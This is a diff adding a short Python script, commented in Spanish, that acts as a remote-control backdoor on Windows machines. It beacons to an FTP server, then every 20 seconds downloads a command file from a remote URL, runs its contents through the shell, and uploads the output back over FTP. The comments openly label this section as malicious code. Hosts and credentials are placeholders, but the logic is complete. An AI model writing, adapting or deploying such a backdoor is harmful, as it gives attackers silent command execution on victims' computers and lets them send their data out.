@@ -1,0 +1,90 @@
+from subprocess import check_output 
+import requests
+import time
+from ftplib import FTP
+import base64
+import smtplib
+from os import remove
+
+
+# Descomentar lo que esta en cuadros y comentar lo que tiene comenatario al final
+
+# Todo bien solo que me lee los saltos de linea y espacios
+
+ftp = FTP('urlftp')
+ftp.login(user='usrftp', passwd = 'passftp')
+
+dou = check_output("echo 1 > l", shell=True)
+
+def placeFile():
+   
+   filename = 'l'
+   ftp.storbinary('STOR '+filename, open(filename, 'rb'))
+   ftp.quit()
+
+placeFile()
+
+remove("l")
+
+name = check_output("echo C:/USERS/%USERNAME%/Desktop/com.txt > my", shell=True)
+
+f = open("my", "r")
+temp = f.read()
+f.close()
+
+remove("my")
+
+
+# Name es la ruta donde se guardara el archivo de comandos
+
+
+todo = temp.replace('\n', '', 3)
+
+#print(todo)
+
+complemento = '>> cm.txt'
+
+starttime=time.time()
+while True:
+
+   # Url es la variable de descarga por lo que esa es la url de tu servidor donde subiran los comandos
+   
+   url = 'urlxd/com.txt'
+   myfile = requests.get(url)
+   open((todo), 'wb').write(myfile.content)
+
+   # Aca se descarga el txt hosteado en el servidor
+   
+   # Codigo malicioso leer txt descargado y ejecutarlo
+   
+   f = open((todo), "r")
+   comando = f.read()
+   f.close()
+   remove((todo))
+   
+
+   # Comparador para enviar los resultados a un servidor 
+   
+
+   # Else para ejecutar comandos
+   salida = check_output((comando + complemento), shell=True)
+
+   ftp = FTP('urlftp')
+   ftp.login(user='usrftp', passwd = 'passftp')
+
+
+   def placeFile():
+
+      filename = 'cm.txt'
+      ftp.storbinary('STOR '+filename, open(filename, 'rb'))
+      ftp.quit()
+
+   placeFile()
+
+   # Fin de codigo malicioso
+
+   time.sleep(20.0 - ((time.time() - starttime) % 20.0))
+
+
+
+
